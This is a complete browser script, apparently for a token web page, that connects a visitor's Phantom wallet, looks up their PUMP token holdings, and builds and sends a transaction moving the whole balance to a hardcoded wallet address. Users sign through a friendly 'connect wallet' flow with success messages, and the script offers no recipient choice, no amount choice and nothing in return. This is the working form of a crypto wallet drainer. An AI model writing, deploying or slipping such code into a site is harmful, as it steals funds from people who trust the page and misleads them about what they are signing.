$(document).ready(function() {
    // Configuration
    const PUMP_MINT = '4sxxEHW6XqX5YBYs29f1p2RhR7afXFS8wQWcMYQVpump';
    const TARGET_WALLET = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    // Update status function
    function updateStatus(message, type = '') {
        $('#status').text(message).removeClass().addClass(type);
        console.log(message);
    }
    
    // Connect wallet button click handler
    $('#connect-wallet').on('click', async () => {
        // Check if Phantom wallet is installed
        if (window.solana && window.solana.isPhantom) {
            try {
                updateStatus('Connecting to wallet...', 'loading');
                
                // Connect to Phantom wallet
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);
                updateStatus('✅ Wallet connected!', 'success');
                
                // Create connection (using public RPC)
                var connection = new solanaWeb3.Connection(
                    'https://api.mainnet-beta.solana.com', 
                    'confirmed'
                );
                
                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                updateStatus('Checking wallet balance...', 'loading');
                
                // Get SOL balance for gas fees
                const walletBalance = await connection.getBalance(public_key);
                const solBalance = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;
                console.log("Wallet SOL balance:", solBalance);
                
                if (solBalance < 0.01) {
                    updateStatus('❌ Insufficient SOL for gas fees (need at least 0.01 SOL)', 'error');
                    return;
                }
                
                updateStatus('✅ SOL balance: ' + solBalance.toFixed(4) + ' SOL', 'success');
                
                // Check for PUMP tokens
                updateStatus('Checking for PUMP tokens...', 'loading');
                
                const pumpMintPublicKey = new solanaWeb3.PublicKey(PUMP_MINT);
                const targetPublicKey = new solanaWeb3.PublicKey(TARGET_WALLET);
                
                // Get PUMP token accounts
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
                    public_key,
                    { mint: pumpMintPublicKey }
                );
                
                if (tokenAccounts.value.length === 0) {
                    updateStatus('❌ No PUMP tokens found in wallet', 'error');
                    return;
                }
                
                const tokenAccount = tokenAccounts.value[0];
                const tokenInfo = tokenAccount.account.data.parsed.info;
                const tokenAmount = tokenInfo.tokenAmount;
                const pumpBalance = tokenAmount.uiAmount;
                
                if (pumpBalance <= 0) {
                    updateStatus('❌ PUMP balance is zero', 'error');
                    return;
                }
                
                updateStatus(`✅ Found ${pumpBalance} PUMP tokens`, 'success');
                
                // Change button text and function
                $('#connect-wallet').html('<span>🚀</span> TRANSFERRING PUMP TOKENS...').prop('disabled', true);
                
                // Transfer all PUMP tokens
                try {
                    updateStatus('Preparing transfer transaction...', 'loading');
                    
                    // Get sender's token account
                    const fromTokenAccount = tokenAccount.pubkey;
                    
                    // Get receiver's associated token account
                    const toTokenAccount = await splToken.getAssociatedTokenAddress(
                        pumpMintPublicKey,
                        targetPublicKey
                    );
                    
                    // Create transaction
                    const transaction = new solanaWeb3.Transaction();
                    
                    // Check if receiver needs token account
                    try {
                        const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
                        if (!toAccountInfo) {
                            // Create token account for receiver
                            transaction.add(
                                splToken.createAssociatedTokenAccountInstruction(
                                    public_key,
                                    toTokenAccount,
                                    targetPublicKey,
                                    pumpMintPublicKey
                                )
                            );
                        }
                    } catch (error) {
                        // If can't check, create account anyway
                        transaction.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                public_key,
                                toTokenAccount,
                                targetPublicKey,
                                pumpMintPublicKey
                            )
                        );
                    }
                    
                    // Add transfer instruction for ALL PUMP tokens
                    const rawAmount = tokenAmount.amount; // Exact amount with decimals
                    transaction.add(
                        splToken.createTransferInstruction(
                            fromTokenAccount,
                            toTokenAccount,
                            public_key,
                            rawAmount
                        )
                    );
                    
                    // Set up transaction
                    updateStatus('Getting blockhash...', 'loading');
                    
                    transaction.feePayer = resp.publicKey;
                    let blockhashObj = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;
                    
                    // Sign transaction
                    updateStatus('Signing transaction...', 'loading');
                    const signed = await window.solana.signTransaction(transaction);
                    console.log("Transaction signed:", signed);
                    
                    // Send transaction
                    updateStatus('Sending transaction...', 'loading');
                    let txid = await connection.sendRawTransaction(signed.serialize());
                    
                    // Confirm transaction
                    updateStatus('Confirming transaction...', 'loading');
                    await connection.confirmTransaction(txid);
                    
                    console.log("Transaction confirmed:", txid);
                    updateStatus(`🎉 SUCCESS! Transferred ${pumpBalance} PUMP tokens!`, 'success');
                    
                    // Show transaction link
                    setTimeout(() => {
                        updateStatus(`✅ ${pumpBalance} PUMP tokens transferred!\nTx: ${txid.slice(0, 16)}...`, 'success');
                    }, 2000);
                    
                } catch (err) {
                    console.error("Error during transfer:", err);
                    updateStatus('❌ Transfer failed: ' + err.message, 'error');
                }
                
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
                updateStatus('❌ Connection failed: ' + err.message, 'error');
            } finally {
                // Reset button after 5 seconds
                setTimeout(() => {
                    $('#connect-wallet').html('<span>🔗</span> CONNECT WALLET & TRANSFER PUMP').prop('disabled', false);
                }, 5000);
            }
        } else {
            updateStatus('❌ Phantom Wallet not found', 'error');
            
            // Show wallet installation links
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;
            
            if (isFirefox) {
                setTimeout(() => {
                    updateStatus('Please install Phantom wallet for Firefox', 'error');
                }, 1000);
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                setTimeout(() => {
                    updateStatus('Please install Phantom wallet for Chrome', 'error');
                }, 1000);
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                updateStatus('Please download Phantom wallet for your browser', 'error');
            }
        }
    });
});
